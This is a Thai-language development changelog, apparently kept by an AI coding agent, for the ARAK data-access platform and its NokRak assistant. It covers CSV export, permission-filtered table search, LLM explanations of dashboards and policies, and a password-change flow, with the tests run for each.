- **สาเหตุ (จำลองผ่าน tunnel ด้วยบัญชี admin)**: การค้นหาเจอตารางจริง (คำค้นที่โมเดลแตกให้ตรงชื่อ schema และชื่อตาราง) แต่ eligibility ของบัญชีนี้คือ `readable=false · requestable=false · blockedKind=DENIED` — policy DENY ของ demo กันทุกคนนอก tenant ของ demo ออกจาก schema นั้น · อนุมัติคำขออย่างเดียวผ่าน DENY ไม่ได้ ตารางจึงเป็น "neither" และถูกทิ้งก่อนถึงโมเดลตามกติกา M16 · ถามด้วยบัญชีใน tenant ของ demo จะเจอ
- **ที่ผิดคือคำตอบ ไม่ใช่การกรอง**: หน้า Catalog แสดงตารางเดียวกันให้ทุกคนพร้อม "You have no access … you can still request access" แต่ NokRak บอกว่าไม่มี
- **แก้**: นับตารางที่ค้นเจอแต่เข้าไม่ถึง **ไม่เอ่ยชื่อ ไม่ส่ง column** — `DataFinder.Result.outOfReach` → `FoundData.outOfReach` · tool `search_catalog` ของแชทใส่ `outOfReach` + note (`AssistToolbox.searchNote`) ให้โมเดลบอกว่ามีตารางแบบนี้อยู่และชี้ไป Catalog แทนการบอกว่าไม่พบ · หน้า Find data: ไม่มีการ์ดเลย → ต่อท้ายข้อความเดิมด้วย "One table matched, but you cannot query or request it now: …" · มีการ์ดแล้ว → บรรทัดเล็กใต้รายการ "N more tables matched …"
- test: `AssistToolboxTest` +2 (นับไม่เอ่ยชื่อ · ไม่มีอะไรเลยยังบอก "nothing was found") + assert ในเคสเดิม · `LlmFindDataTest` assert `outOfReach` 2 เคส · `FindData.test.tsx` +2

**รวมรอบนี้** — frontend 777 / 79 suites ผ่าน · backend 778 ผ่าน · bundle `index-C9Gasks4.js`

**คำอธิบายตัวอย่างของตาราง PO บน prod** — ใส่แล้ว 49 column (`set 49 · cleared 0 · unchanged 0` · หน้าตารางแสดงทั้ง 49 เป็นของ ARAK) · รหัสแรกที่ได้มาเป็นของ local (prod ตอบ 401) · รหัสที่สองผู้ใช้ส่งมาใช้ได้ · ส่งผ่าน env inline ครั้งเดียวผ่าน SSH tunnel · **ไม่ได้เก็บรหัสไว้ที่ไหน**

## รอบก่อนหน้า — **ข้อ CL: All rows (ดาวน์โหลดทุกแถว) · explorer hover / คลิกขวา · ลากขนาดแผงในหน้า Query (FR-6.3)**

ผู้ใช้ถาม "ทำไมมีจำกัด Row" → "ต้อง Query ได้ทั้งหมดสิ" · ขอ hover column ให้บอก description + คลิกขวาไป Data Catalog · ขอให้ลาก editor ขึ้นลงได้ "เยอะกว่านี้" · ขอให้ลากเส้นระหว่าง editor กับ explanation ซ้ายขวาได้

**ทำไมไม่ยกเพดาน 5,000 แถวบนจอ**
- grid เป็นตาราง DOM ธรรมดา (ไม่ virtualize) และ JSON ถือทุกแถวไว้ในหน่วยความจำของ browser — ยกเพดานเท่ากับทำให้หน้าค้างกับตารางใหญ่ · จอจึงคงเพดานไว้ แล้วเพิ่ม **ทางที่สอง** ที่คนหมายถึงเวลาพูดว่า "ทั้งหมด" คือไฟล์
- ปุ่ม **All rows** ขึ้นข้างผลลัพธ์ **เฉพาะตอนที่ผลถูกตัด** (`truncated`) · กดแล้วรัน statement เดิมอีกครั้งแบบไม่มีเพดาน เขียนเป็น CSV ระหว่างอ่าน — ทั้ง ARAK และ browser ไม่ถือทั้งตาราง

**backend**
- `POST /v1/query/export` body เดียวกับ `/v1/query` (`Ask`) → `text/csv; charset=UTF-8` แบบ stream · `Content-Disposition: attachment; filename="<table>-all-rows.csv"` (ไม่มีตาราง → `query-all-rows.csv`) · `X-Accel-Buffering: no` (nginx ไม่ buffer ทั้งไฟล์) · `Cache-Control: no-store`
- **ผ่านทุกด่านเดียวกับ `run`** ก่อนไบต์แรก: policy rewrite · slot ของ admission · cost guard (**ตีราคาแบบไม่มี row limit** — ข้อความปฏิเสธบอกว่าให้ใส่ WHERE) · คำตอบแรกของ source · ถูกปฏิเสธ → 403 JSON `{message, fixable, assetFqn?}` ก่อนเริ่มไฟล์ · busy → 429 เหมือนเดิม
- **เป็นตัวเองเท่านั้น** — `asPrincipal` ที่ไม่ใช่ตัวผู้เรียก → 403 *A download is always of your own rows; running as somebody else stays on screen* (ปฏิเสธ ไม่เงียบทิ้ง) · ไม่ใช้ result cache
- พังกลางทาง → ตัด response (browser รายงานว่าดาวน์โหลดล้มเหลว **ไม่เซฟไฟล์ครึ่งตารางเหมือนเป็นไฟล์เต็ม**) · audit เป็น FAILED
- เวลาสูงสุดของทั้งไฟล์ `queryLimits.exportTimeoutSeconds` (env `QUERY_EXPORT_TIMEOUT_SECONDS`, default **600**) · `QueryExecutor.open()` คืน `Cursor` (fetch size ของ export) · `CostEstimate` rowCap ≤ 0 = ไม่จำกัด
- `policy/QueryCsv` (ใหม่) — กติกาเดียวกับปุ่ม CSV บนจอ (`lib/tabular.ts`): BOM · CRLF · RFC 4180 · null = ช่องว่าง · **กัน formula injection** (ค่าที่ขึ้นต้น `= + - @` tab CR ถูกเติม `'`) · ตัวเลขเขียนเต็ม ไม่มี `1E+3`
- **Flyway V42** `audit_query.exported boolean NOT NULL DEFAULT false` — ตั้งทั้งตอนสำเร็จ ถูกปฏิเสธ และล้มเหลว (คนที่พยายามเอาสำเนาออกไปก็ควรหาเจอ) · `QueryLog` / `GET /v1/audit/queries` คืน `exported`

**frontend**
- `api/query.ts` `exportQuery` (blob · อ่าน JSON ของคำปฏิเสธออกจาก blob) · `pages/query/DownloadAll.tsx` ปุ่ม **All rows** (ซ่อนเมื่อ run as คนอื่น · แถบแจ้งผลใต้ผลลัพธ์) · hint ของ Row limit บอกว่า "When there are more, “All rows” beside the results downloads every one."
- Query log: badge **downloaded** ที่แถวที่เป็นการดาวน์โหลด
- **Explorer** (`SchemaExplorer.tsx`): hover / focus column → tooltip `ชื่อ · type` + description (ตัด HTML · ยาวเกิน 400 ตัดด้วย …) + tag / term ที่เจาะจงที่สุด · ไม่มี description → บอกว่าเพิ่มได้ที่แท็บ Columns · **คลิกขวา** ตาราง / column → เมนู *Open in the Data Catalog* (แท็บใหม่ · column เปิดที่แท็บ columns) · *Insert into the editor* · *Copy the full name* · ใช้คีย์บอร์ดได้ (ลูกศร · Esc)
- **`pages/query/Splitters.tsx` (ใหม่)** — `WidthSplitter` / `HeightSplitter` ตัวเดียวใช้ 3 จุด (explorer | editor · editor | explanation · editor เหนือผลลัพธ์) · ลากหรือใช้ลูกศร (Shift = ก้าวใหญ่) · จำขนาดต่อ browser (`localStorage`, ห่อ try/catch)
  - editor ขึ้นลง: ต่ำสุด **40px** (ราวบรรทัดเดียว) · ผลลัพธ์เหลืออย่างน้อย **96px** (เดิมกันไว้มากกว่านี้ ผู้ใช้ขอพื้นที่เพิ่ม)
  - explanation ซ้ายขวา: ต่ำสุด 240px · editor เหลืออย่างน้อย 240px · กว้างที่จำไว้จากจอใหญ่ถูกตัดด้วย CSS `maxWidth` บนจอเล็ก ไม่ดัน editor ตกขอบ

**test**
- `QueryCsvTest` 6 · `QueryExportResourceTest` 7 · `AuditResourceTest` / `AssistToolboxTest` ปรับตาม `exported` → backend **776 ผ่าน**
- jest: `DownloadAll.test` 7 · `SchemaExplorer.test` 10 · `Splitters.test` 10 · `query.test` +3 · `QueryLogPage.test` +1 → **772 ผ่าน / 79 suites**
- **ยิงจริงบน local แล้วผ่าน** (admin · statement ไม่แตะตาราง เพราะ admin ยังอ่านตารางไหนบน local ไม่ได้): จอตัดที่ 2 แถว → ไฟล์ได้ครบ 4 แถว · BOM · header ตรง · comma / quote / null ถูกต้อง · ตารางที่ไม่มีสิทธิ์ → 403 JSON มี `assetFqn` · DELETE → 403 `fixable:false` · asPrincipal คนอื่น → 403 · ชื่อตัวเอง → 200 · query log ติด `exported:true` ทั้งที่สำเร็จและถูกปฏิเสธ · ไม่มี token → 401

**ยังไม่ทำ (ตั้งใจแยก)**
- ไฟล์รูปแบบอื่น (xlsx / parquet) · ดาวน์โหลดแบบ async ที่ส่งลิงก์ทีหลัง — CSV แบบ stream พอสำหรับวันนี้ และไม่ต้องเก็บสำเนาข้อมูลไว้ฝั่ง ARAK

## รอบก่อนหน้า — **ข้อ CK: Find data — NokRak หาตารางจากประโยค (M16)**

ผู้ใช้สั่ง "ทำอย่างอื่นต่อได้เลย" → ทำ M16 ตาม AP.4 · M11 (per-user gateway) กับ M13 (ปุ่มขอสิทธิ์) มีแล้วจึงไม่ติดอะไร

**ลำดับที่ server ทำ (สิทธิ์อยู่ตรงกลาง ก่อนโมเดลเห็นตาราง)**
1. ถามโมเดลครั้งที่ 1 ด้วย **ประโยคอย่างเดียว** → ขอคำค้นภาษาอังกฤษ ≤ 8 คำ (แปล · เติมคำย่อ · ห้ามใส่ชื่อคน / ค่า / วันที่ / ตัวเลข) · ตอบไม่เป็น JSON → ใช้คำในประโยคเอง (`AssistPrompts.wordsOf`)
2. ค้นแต่ละคำด้วย `SearchQuery` (30 hit ต่อคำ) → ให้คะแนนต่อตาราง (ชื่อ / description ตรง = 3 · column ตรง = 1 · คำหนึ่งนับครั้งเดียวต่อตาราง) เรียงมากไปน้อย
3. **ตรวจสิทธิ์ทีละตาราง** ด้วย `AssistToolbox.seen()` (ตัวเดียวกับที่แชทใช้ · ตรวจไม่เกิน 30 · เก็บไม่เกิน 10) — ตารางที่อ่านไม่ได้และขอไม่ได้ **ถูกทิ้งตรงนี้ ไม่เคยถูกเขียนลง prompt** · ตารางที่อ่านได้ถูกตัด column ที่ decision ซ่อนออก (`hiddenColumns`)
4. ไม่เหลือสักตาราง → ตอบรายการว่าง **ไม่ถามโมเดลครั้งที่ 2**
5. ถามโมเดลครั้งที่ 2 ด้วยประโยค + metadata ของตารางที่เหลือ (ชื่อ · description · column · type · tag — column ที่คำค้นพูดถึงมาก่อน ≤ 60 ต่อตาราง) · กติกา: ไม่เคยเห็นข้อมูล · ห้ามแต่งตาราง / column · **ห้ามพูดว่าอ่านได้หรือไม่** · ≤ 6 ตาราง ≤ 8 column · เหตุผลเป็นภาษาของประโยค
6. `extractPicks` เอาเฉพาะตาราง / column ที่ส่งไปจริง (เทียบไม่สนตัวพิมพ์ แล้วคืนชื่อตาม catalogue) · ตอบไม่เป็นรายการ → 503 "The assistant did not answer with a list of tables" (ไม่เดา)
7. access ของแต่ละตาราง **มาจากการตรวจในข้อ 3 ไม่ใช่จากโมเดล** · แนบ source ที่ query ไปถึงตารางได้ (`querySource` ก่อน `dataSource`)

**backend**
- `POST /v1/llm/assist/find-data` body `{want, language, model}` → `{tables:[{fqn, access, description, why, columns, sourceId, engine}], keywords, model, personal}` · want ว่าง / < 2 ตัว → 400 · > 500 ตัว → 400 · feature `CATALOG_SEARCH` (ตัวเดียวกับที่แชทใช้ค้น catalogue — description ใหม่บอกว่ามีทั้งในแชทและหน้า Query) · ไม่ได้ wire toolbox → 503
- `resources/DataFinder` (ใหม่) · `AssistToolbox.seen()` (ใหม่ — `describe_asset` ใช้ตัวนี้แล้ว ผลเหมือนเดิม) · `AssistPrompts` section *find data (M16)*
- **ไม่ run อะไร ไม่ส่งคำขออะไร** — หน้าเว็บเสนอปุ่ม คนกดเอง

**frontend**
- `api/llm.ts` `assistFindData` (timeout 180s) · type `FoundTable` / `FoundData`
- `pages/query/FindData.tsx` — panel **Ask NokRak where the data is** (ปุ่ม **Find data** ข้าง "NokRak, write it" ในแถบ editor · เปิดได้ทีละ panel · ไม่ต้องเลือก source ก่อน)
  - ภาษาของเหตุผล = ภาษาของประโยค (มีตัวอักษรไทย → Thai)
  - การ์ดต่อตาราง: FQN (ลิงก์ไปหน้า catalogue) · badge *You can query / You can request* แบบเดียวกับ catalogue · description · เหตุผล · column ที่เข้าข่าย
  - อ่านได้ → **Put in the editor** เติม `SELECT <column> FROM schema.table` และสลับไป source ของตาราง (ถ้าหน้า Query เข้าถึงได้) · column ที่ต้อง quote (Postgres ตัวใหญ่ · คำสงวน · เว้นวรรค) → ใช้ `SELECT *` แทน
  - ขอได้ → `AssetAccessAction` ตัวเดียวกับหัวหน้าตาราง (เปิดฟอร์มขอสิทธิ์ในที่ · ถ้ามีคำขอค้างอยู่ขึ้น *Access requested*)
  - ไม่เจอ → บอกตรงๆ + ลิงก์ไป catalogue
- คู่มือ (`docs/user-guide.md` · NokRak ตอบจากคู่มือนี้ได้): bullet **Find data** ใน *NokRak on the Query page* + บรรทัดในรายการของ NokRak
- **หน้า Catalog** ใช้ปุ่ม **Ask NokRak** เดิม (ส่งคำถามเข้าแชท ซึ่งค้นด้วย tool ที่กรองสิทธิ์ชุดเดียวกัน) · ไม่เพิ่มปุ่มที่สองให้รก

**test**
- `LlmFindDataTest` 12 (เฉพาะตารางที่อ่าน / ขอได้ · ตารางนอกสองกองไม่ถูกเอ่ยถึงใน prompt ไหนเลย · คำถามแรกเป็นประโยคอย่างเดียว · column ที่ decision ซ่อนไม่อยู่ทั้งใน prompt และผล · ของที่โมเดลแต่งถูกทิ้ง · แนบ source · fallback คำค้น · ไม่เจอถามครั้งเดียว · ตอบไม่เป็นรายการ 503 · ความยาวประโยค · feature gate · ปิด assistant) · `AssistPromptsTest$FindData` 7
- jest: `FindData.test` 10 → **741 ผ่าน / 76 suites**
- **ข้อ CK.1 — ยิงกับ LLM จริงบน local แล้วผ่าน** (admin): ประโยคอังกฤษ / ไทย / เรื่องที่ไม่มีในระบบ → 200 · `access` ของทุกตารางที่ตอบตรงกับ eligibility · ส่ง `language: Thai` แล้วเหตุผลเป็นภาษาไทย · ตารางที่ admin ทั้งอ่านไม่ได้และขอไม่ได้ (ไม่มี source ที่ ARAK ต่อได้) 31 จาก 87 ตัว — ถามด้วยชื่อตรงๆ ก็ไม่โผล่ · ตั้งคำถามที่ไม่มีคำตอบ → รายการว่าง · บัญชีธรรมดาที่ไม่มี assistant ของตัวเอง → 403 *The assistant is not switched on for this account* (ถูกตาม per-user gateway)

**ยังไม่ทำ (ตั้งใจแยก)**
- flag "ปฏิเสธโดยไม่บอกอะไร" ต่อ policy (AP.1 / AP.4 ข้อ 2) — วันนี้ตารางในกอง *ขอได้* ก็เห็นอยู่แล้วในหน้า Catalog (ทุกคนที่ login เห็นรายการ asset) และในแชท · M16 จึงไม่เปิดเผยอะไรเพิ่ม แต่เมื่อทำ flag นี้ต้องครอบทั้ง Catalog · แชท · find-data พร้อมกัน

## รอบก่อนหน้า — **ข้อ CJ: NokRak อธิบาย dashboard (M15 (ข)) — M15 ครบ**

ผู้ใช้สั่ง "ทำต่อครับ" → ทำ M15 (ข) ตาม AP.3 · M10 เสร็จแล้วตั้งแต่ข้อ BE จึงไม่ติดอะไร

**ข้อตัดสินใจ: panel เดียว ไม่ใส่ปุ่มทุกกราฟ** — AP.3 เขียนไว้ว่า "ปุ่มบนแต่ละกราฟ" แต่การ์ดส่วนใหญ่กว้าง 1/3 ของจอ ใส่คำตอบ 200–300 คำไม่ได้ · เลยทำ panel **Ask NokRak** ตัวเดียวใต้ key figures มี dropdown **About** (Whole dashboard / Coverage / Queries & refusals / Access & grants / Requests / Platform health) → ได้ผลเดียวกับ "กดที่กราฟ" แต่คำตอบมีที่วาง

**backend**
- `LlmFeatureStore.Feature.EXPLAIN_DASHBOARD` ("Explain the dashboard") · admin คุมต่อ role ได้ใน *Who gets which job*
- `POST /v1/llm/assist/explain-dashboard` body `{days, label, focus, language, model}` → `{text, model, personal}` · ลำดับตรวจ: ไม่มี body 400 → focus ไม่รู้จัก 400 → ไม่ได้ wire 404 → `ready()` (403 / 503) → `DashboardResource.dashboard(days ?? 30, label ?? "PII", security)` (**คนที่ไม่ใช่ admin / policy author / auditor ได้ 403 จากตัว dashboard เอง** · days / label ผิด 400) → ถาม → คำตอบว่าง 503
- `resources/DashboardBrief` (ใหม่) — เขียน `Dashboard` เป็นข้อความสั้นๆ ตาม focus:
  - หัว: window + วันเริ่ม (UTC) · label · หัวข้อที่ถาม
  - *Needs attention* กรองตาม focus (ACTIVITY ไม่มี) · GRANTS_ENDING บอกคนแรกเป็น `[Pn]` · REQUESTS_WAITING บอกว่ารอมากี่วัน
  - coverage ≤ 15 table + "and N more" · **owner ส่งเป็นจำนวน ไม่ส่งชื่อ**
  - query ต่อวัน: ≤ 31 วันรายวัน · ยาวกว่านั้นรวมเป็นช่วงละ `ceil(days/30)` วัน · ส่งเฉพาะช่วงที่ไม่เป็นศูนย์ · refusal ตามหมวด · table ที่ถูกอ่านมากสุด · คนที่ query มากสุด
  - grant ที่มีผล / ใกล้หมด (ชื่อคนเป็น `[Pn]`) · request (median ชั่วโมง) · health (source · enforced object · policy · sync)
  - `People` ให้เลข `[P1]`, `[P2]` ตามลำดับที่พบ · `restorePeople` แทนกลับเฉพาะเลขที่มีจริง เลขที่โมเดลแต่งขึ้นเอง (เช่น `[P7]`) คงไว้ตามเดิม
- `AssistPrompts.explainDashboardSystem(language)` — นิยาม metric ตามที่หน้า dashboard ใช้จริง (default deny · protected · refusal ทุกหมวด · DRIFTED / FAILED · HIGH / MEDIUM / LOW) + กติกา: ใช้ tag `[Pn]` ตรงตัว ห้ามเดาว่าเป็นใคร · ห้ามแต่งตัวเลข · "A count is not a verdict" · ไม่เคยเห็นข้อมูล · เป็น reading aid · < 300 คำ
- `DacApplication` ส่ง `dashboard` instance ตัวเดิมให้ `LlmAssistResource` (constructor 7 ตัว · 6 ตัวเดิมยังอยู่)
- **ไม่ส่ง**: แถวข้อมูล · SQL · IP · ชื่อ owner · ชื่อคน (ส่งเป็นเลข) · ไม่มีทางเขียน

**frontend**
- `api/llm.ts` `assistExplainDashboard` (timeout 180s) · type `DashboardFocus` · `AssistFeature` + `'EXPLAIN_DASHBOARD'`
- `pages/dashboard/DashboardExplain.tsx` — ไม่วาดถ้า `useAssistReady('EXPLAIN_DASHBOARD')` เป็น false · ส่ง days / label ที่อยู่บนจอ · key ด้วย `days:label` ให้คำตอบเก่าหายเมื่อเปลี่ยน window หรือ label · ป้าย "NokRak wrote this from the counts on this page — it has not seen any data, and people were numbered for it rather than named. The numbers on the dashboard are what count."
- คู่มือ: section ใหม่ *Explain the dashboard with NokRak* + บรรทัดในรายการของ NokRak (NokRak ตอบจากคู่มือนี้ได้ด้วย)

**test**
- `DashboardBriefTest` 8 (ไม่มีชื่อคน / owner หลุด · ทั้งหน้า · focus · ไม่มีอะไรรอ · ตัดที่ 15 table · รวมวันเป็นช่วง · แทนชื่อกลับ · parse focus) · `LlmAssistResourceTest$ExplainDashboard` 7 (payload ไม่มีชื่อ + แทนกลับ · อ่าน days / label / focus ที่ส่งมา · 400 ก่อนแตะ dashboard · feature gate · คนที่ไม่ใช่ overseer 403 · ไม่ wire 404 · คำตอบว่าง 503) · `AssistPromptsTest$ExplainDashboard` 2 → backend unit **633 ผ่าน**
- jest: `DashboardExplain.test` 4 · `DashboardPage.test` mock panel ไว้ → **731 ผ่าน / 75 suites**
- local: route `POST /api/v1/llm/assist/explain-dashboard` ขึ้น · ไม่มี token 401 · bundle มี panel
- **ข้อ CJ.1 — ยิงกับ LLM จริงแล้ว** (`scratchpad/e2e_dashboard.py` · admin ของ local ใช้รหัสที่ผู้ใช้ให้มา ส่งเป็น env `ARAK_ADMIN_PASSWORD` ไม่เขียนลงไฟล์ · รหัส bootstrap ใน `.env` ใช้ไม่ได้แล้วเพราะ `DacApplication` ข้ามมันเมื่อมีบัญชี local อยู่แล้ว)
  - ไม่มี token 401 · ไม่มี body 400 · focus ผิด 400 · days 999 → 400 · features มี `EXPLAIN_DASHBOARD`
  - English / ALL · Thai / ACTIVITY · 90 วัน / ACCESS → 200 ทั้งสาม · **ไม่มี `[Pn]` ค้างในคำตอบ** · ชื่อคนถูกแทนกลับ (2 / 2 / 1 คน) · ตัวเลขในคำตอบตรงกับ dashboard (refused / ran / POLICY_DENY / UNGOVERNED)
  - **เจอ 1 จุด**: ภาษาไทยเรียก query ว่า "คำขอ" ซึ่งบนหน้า ARAK หมายถึงคำขอสิทธิ์ → อ่านแล้วสับสน · แก้ `AssistPrompts.explainDashboardSystem`: กติกาใหม่ "Keep queries and access requests apart" + ถ้าเป็นไทยให้เขียน "query" / "คำขอสิทธิ์" และห้ามเรียก query ว่า "คำขอ" · test `AssistPromptsTest$ExplainDashboard` ตรวจทั้งสองภาษา (ภาษาอังกฤษต้องไม่มีคำไทยหลุด) → unit **633 ผ่าน** · ยิงซ้ำ: "query ถูกปฏิเสธ 208 ครั้ง" · "ประวัติของคำขอสิทธิ์" ✓
- ⚠️ **start local จาก Git Bash** ต้อง `export MSYS2_ENV_CONV_EXCL=APP_WEB_BASE_PATH` (หรือ `MSYS_NO_PATHCONV=1`) ไม่งั้น `/Arak/` ถูกแปลงเป็น `C:/Program Files/Git/Arak/` → log ขึ้น "bundle was built for /Arak/ but web.basePath is …" และ `/Arak/api/*` ตอบ index.html (200) แทน 401

## ก่อนหน้านั้น — **ข้อ CI: NokRak อธิบาย policy (M15 (ก))**

ผู้ใช้สั่ง "ทำต่อครับ M อื่น" → ทำ M15 (ก) ตาม AP.3 · (ข) อธิบาย dashboard ยังไม่ทำ

**backend**
- `LlmFeatureStore.Feature.EXPLAIN_POLICY` ("Explain a policy") · admin คุมต่อ role ได้ในตาราง *Who gets which job* เหมือน job อื่น
- `POST /v1/llm/assist/explain-policy` body `{policyId, language, model}` → `{text, model, personal}` · ลำดับตรวจ: ไม่มี policyId 400 → ไม่ได้ wire 404 → `ready()` (ปิด / ไม่ได้ให้ role 403 · gateway ใช้ไม่ได้ 503) → ไม่มี policy 404 → ถาม → คำตอบว่าง 503
- server **โหลด policy เอง** (ไม่รับ document จาก request) · `LlmAssistResource.PolicyReading(PolicyStore, PolicyOverview, ObjectMapper)` · `DacApplication` สร้าง `PolicyOverview` ตัวเดียวแล้วส่งให้ทั้ง PolicyResource และ LlmAssistResource
- ของที่ส่งให้โมเดล (`AssistPrompts.explainPolicyUser`):
  - `policyForExplaining` — ตัด store fields + `id` · exemptions / approvers ที่ไม่ว่าง → `exemptionsCount` / `approversCount` (ไม่ส่งชื่อคนหรือเหตุผล) · ว่าง → ตัดทิ้ง · ไม่ใช่ JSON object หรือเกิน 50,000 ตัว → 400
  - state + environment · coverage (จำนวน table / column + FQN ≤ 20 ตัว + "and more")
  - overlap ≤ 10 ตัว: ชื่อ · scope · type · effect · state · จำนวน target ที่ทับ · relation + explanation + overrideNote จาก `PolicyOverview.overlaps` (verdict ตัวเดียวกับ tab Conflicts)
- `explainPolicySystem(language)` สอนกติกา compose: default deny · DENY ชนะ · allowLocalOverride · row filter AND · ลำดับ mask · ACTIVE เท่านั้นที่มีผล · ห้ามแต่ง · บอกว่าไม่เคยเห็นข้อมูล · เป็น reading aid
- **ไม่ส่ง impact analysis** (ชื่อคน) · ไม่มีแถวข้อมูล · ไม่มีทางเขียน
- สิทธิ์: GET `/v1/policies/{id}` เปิดให้ทุกคนที่ login แล้ว (FR-3.1.5) → endpoint นี้ไม่เพิ่มการเปิดเผยข้อมูล และส่งให้โมเดลน้อยกว่าที่ GET คืนเสียอีก

**frontend**
- `api/llm.ts` `assistExplainPolicy` (timeout 180s) · `AssistFeature` + `'EXPLAIN_POLICY'`
- `pages/policies/PolicyExplain.tsx` — panel **Ask NokRak** ใต้ *In plain words* ใน tab Overview · ไม่วาดเลยถ้า `useAssistReady('EXPLAIN_POLICY')` เป็น false · เลือกภาษา English / ไทย · ป้าย "NokRak wrote this … has not seen any data. What the engine decides is what the Simulator shows" + ลิงก์ `/simulator` + ชื่อ model · key ด้วย `id:version` เพื่อให้คำอธิบายของ version เก่าหายไปเมื่อ policy ถูกแก้
- คู่มือ: section ใหม่ *Explain a policy with NokRak* + บรรทัดในรายการของ NokRak

**test**
- `AssistPromptsTest$ExplainPolicy` 7 · `LlmAssistResourceTest$ExplainPolicy` 6 (ข้อมูลที่ออกไปไม่มีชื่อ exemption / approver / author / policy id · มี target + neighbour · ภาษา · feature gate ไม่แตะ store / client · 400 / 404 / 503) → backend unit **616 ผ่าน**
  - baseline 639 ที่เคยบันทึกไว้นับรวม IT แบบ nested จากรอบที่รันเมื่อคืนอีก 36 ตัว · unit ล้วนก่อนรอบนี้คือ 603
- jest: `PolicyExplain.test` 4 → **727 ผ่าน / 74 suites**

## รอบก่อนหน้า — **ข้อ CH: ปุ่ม Query ที่หัวหน้าตาราง (FR-1.6d)**

ผู้ใช้ถาม "ทำไมหาปุ่ม Query ไม่เจอ" — หน้าตารางที่อ่านได้แล้วมีแค่ป้าย "You can query" (AccessBadge) กับป้าย "You can read this" (AssetAccessAction) ซึ่งพูดเรื่องเดียวกันสองครั้ง และไม่มีทางไปหน้า Query จากตาราง

- `AssetAccessAction` เมื่อ `readable` → ปุ่ม primary **Query** (ไอคอนเดียวกับเมนู Query) แทนป้ายซ้ำ · สถานะอื่น (Not connected / Access requested / Request access) เหมือนเดิม
- กด → `assistStore.deliverSql("SELECT *\nFROM schema.table", sourceId)` แล้ว `navigate('/query')` — ทางเดียวกับปุ่ม "Put it in the editor" ของ NokRak · หน้า Query รอ list source โหลดก่อนแล้วเลือก source ให้ · **ไม่รันเอง**
- source id หาจากชื่อ `asset.querySource` ใน `GET /v1/sources` (key `['sources']` เดียวกับหน้า Query → fetch ครั้งเดียว) · ไม่มี `querySource` ไม่ fetch · หาไม่เจอ → ส่ง SQL ไปโดยไม่ระบุ source (หน้า Query เลือกเองถ้ามี source เดียว)
- ชื่อตาราง = 2 segment ท้ายของ FQN แบบเดียวกับ SchemaExplorer (proxy ไม่รับชื่อตารางเปล่า)
- คู่มือ *A table's page* แก้ตามแล้ว (NokRak ตอบจากคู่มือ)
- jest: `AssetRequestAccess.test` +2 (ปุ่ม Query แทนป้าย · กดแล้วส่ง SQL + source ถูกตัว · ไม่มี source ก็ยังเปิด) → **723 ผ่าน** · ไม่มีการแก้ backend

## รอบก่อนหน้า — **ข้อ CG: เปลี่ยนรหัสผ่านเองได้ + บังคับเปลี่ยนเมื่อรหัสผ่านถูก admin ตั้ง (M2 · FR-2.2)**

ทำต่อจาก milestone ที่ค้าง: `local_credential.must_change` มีมาตั้งแต่แรก (bootstrap · สร้างบัญชี · admin reset ตั้งเป็น true ทุกทาง) แต่ไม่มีหน้าไหนใช้ และคู่มือบอกว่า "ยังไม่มีหน้าเปลี่ยนรหัสผ่านเอง"

### CG.1 Backend
- `AuthResource` `POST /v1/auth/password` `{currentPassword, newPassword}` ตรวจตามลำดับ: ช่องว่าง → 400 · สั้นกว่า 12 / ยาวกว่า 200 → 400 · เท่ากับ username (ไม่สนตัวพิมพ์) → 400 · เท่ากับรหัสเดิม → 400 · ไม่มีรหัส local (บัญชี directory หรือชื่อซ้ำแต่ id ไม่ตรง) → 403 · บัญชีถูกปิด → 403 · ถูก lock → **429** · รหัสเดิมผิด → `recordFailure` (นับเป็น failed sign-in ตาม `maxFailedLoginAttempts` / `lockoutSeconds`) + **403** (ไม่ใช่ 401 เพราะ axios interceptor ถือ 401 = session หมด แล้วเด้งออก) · ผ่าน → `{"status":"changed"}` · ล้าง char array ทุกทาง
- `LocalIdentityDao.changeOwnPassword` ใน transaction เดียว: hash ใหม่ · `must_change=false` · ล้าง failed attempts / lock · audit `audit_identity_change` `SET_PASSWORD` actor = เจ้าของบัญชี reason "changed by the account holder" · ไม่มี migration
- `GET /v1/auth/me` คืน `mustChangePassword` เพิ่ม (เฉพาะ `source=local` และ id ตรงกับบัญชี local) → reload หน้าไม่ใช่ทางหนีหน้าบังคับ
- ค้นบัญชีด้วย username แล้ว **กรองด้วย id** กันชื่อชนข้าม directory

### CG.2 Frontend
- `auth/ChangePasswordForm.tsx` — รหัสเดิม · ใหม่ · ยืนยัน · ตรวจฝั่ง client ก่อนส่ง (ไม่เปลือง attempt กับเรื่องพิมพ์ไม่ตรง) · สำเร็จ → บอก + `passwordChanged()` ใน store · error → ข้อความจาก backend · ล้างทั้ง 3 ช่องหลังทุกครั้งที่ส่ง
- `auth/PasswordChangeGate.tsx` — หน้า "Choose a new password" แทนหน้าที่ขอ (ไม่ redirect · URL เดิมอยู่ · เปลี่ยนเสร็จหน้านั้นขึ้นเอง) · มีปุ่ม "Sign out instead"
- `RequireAuth` แสดง gate เมื่อ `mustChangePassword` · `authStore.refresh` อ่าน flag จาก `/me` · `ProfilePage` มี section Password (บัญชี local) / บอกให้ไปเปลี่ยนที่ directory (บัญชีอื่น)
- คู่มือ `docs/user-guide.md` หัวข้อ *Signing in and your account* แก้ตามแล้ว (NokRak ตอบจากหัวข้อนี้)

### CG.3 Test
- `AuthResourceTest` 7 (เปลี่ยนได้ + IP ลง audit · รหัสเดิมผิดนับ failure · lock → 429 · รหัสอ่อน/ซ้ำ ไม่แตะ store · ไม่มีรหัส local / id ไม่ตรง → 403 · `/me` มี flag · บัญชี entra ไม่ถูกถาม) · `IdentityAdminStoreIT.changingOnesOwnPassword` (lock แล้วเปลี่ยน → ปลด lock · must_change false · audit ถูก) · backend unit **639 ผ่าน** · IT 36 ผ่าน
- jest: `ChangePasswordForm.test` 4 · `RequireAuth.test` +1 (gate แทนหน้า ไม่ redirect) · `ProfilePage.test` +2 → **721 ผ่าน**

### CG.4 ข้อจำกัดที่รู้ (ตั้งใจไว้ก่อน)
- **gate อยู่ฝั่ง UI อย่างเดียว** — JWT ไม่มี claim must-change และ API อื่นไม่ปฏิเสธ คนที่ยิง API ตรงด้วย token ยังใช้ได้ (สิทธิ์เท่าเดิม ไม่ได้เพิ่ม) · ถ้าจะบังคับฝั่ง server ต้องใส่ claim แล้วให้ filter ปฏิเสธทุก path ยกเว้น `/auth/me` `/auth/password`
- **token เป็น stateless** — เปลี่ยนรหัสแล้ว session อื่นที่เปิดอยู่ยังใช้ได้จนหมดอายุ (คู่มือบอกไว้) · จะตัดทันทีต้องมี token version ต่อ principal
